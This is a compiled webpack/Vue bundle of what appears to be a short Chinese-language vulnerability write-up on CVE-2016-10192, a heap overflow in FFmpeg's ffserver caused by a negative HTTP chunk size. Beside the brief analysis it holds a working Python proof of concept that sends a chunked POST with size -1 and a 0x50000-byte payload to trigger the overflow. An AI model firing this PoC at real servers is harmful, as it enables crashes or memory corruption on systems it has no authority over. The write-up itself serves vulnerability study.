(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{289:function(n,t,e){n.exports=e.p+"assets/img/CVE-2016-10192-1.0d86794d.png"},290:function(n,t,e){n.exports=e.p+"assets/img/CVE-2016-10192-2.1f07aba7.png"},361:function(n,t,e){"use strict";e.r(t);var c=[function(){var n=this,t=n.$createElement,c=n._self._c||t;return c("div",{staticClass:"content"},[c("h1",{attrs:{id:"cve-2016-10192"}},[c("a",{staticClass:"header-anchor",attrs:{href:"#cve-2016-10192","aria-hidden":"true"}},[n._v("#")]),n._v(" cve-2016-10192")]),n._v(" "),c("p",[n._v("0x1 漏洞分析\n漏洞影响ffserver程序，和cve-2016-10190类似，当c->chunk_size负数时，recv溢出。")]),n._v(" "),c("p",[c("img",{attrs:{src:e(289),alt:""}})]),n._v(" "),c("table",[c("thead",[c("tr",[c("th",[n._v("http_receive_data")]),n._v(" "),c("th",[n._v("handle_connection")]),n._v(" "),c("th",[n._v("http_server")]),n._v(" "),c("th",[n._v("main")])])]),n._v(" "),c("tbody",[c("tr",[c("td",[n._v("c->chunk_size = strtol(c->buffer, 0, 16);"),c("br"),n._v("recv(c->fd, c->buffer_ptr,"),c("br"),n._v("     FFMIN(c->chunk_size, c->buffer_end - c->buffer_ptr), 0);")]),n._v(" "),c("td",[n._v("http_receive_data(c)")]),n._v(" "),c("td",[n._v("handle_connection(c)")]),n._v(" "),c("td",[n._v("http_server()")])])])]),n._v(" "),c("p",[n._v("0x2 poc")]),n._v(" "),c("div",{staticClass:"language- extra-class"},[c("pre",{pre:!0,attrs:{class:"language-text"}},[c("code",[n._v('import socket\n\nbind_ip = \'127.0.0.1\'\nbind_port = 9999\n\nheaders = """POST /feed1.ffm HTTP/1.1\\r\\nHost: 127.0.0.1:9999\\r\\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.18.4\nPragma: client-id=123456\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n\n-1\\r\\n"""\n\n\nif __name__ == \'__main__\':\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    s.connect((bind_ip, bind_port))\n    s.send(headers)\n    \n    data = \'\'\n    data += "fm"\n    data += "a"*0x50000\n    s.send(data)\n\n    s.close()\n\n')])])]),c("p",[c("img",{attrs:{src:e(290),alt:""}})])])}],s=e(1),a=Object(s.a)({},function(){this.$createElement;this._self._c;return this._m(0)},c,!1,null,null,null);t.default=a.exports}}]);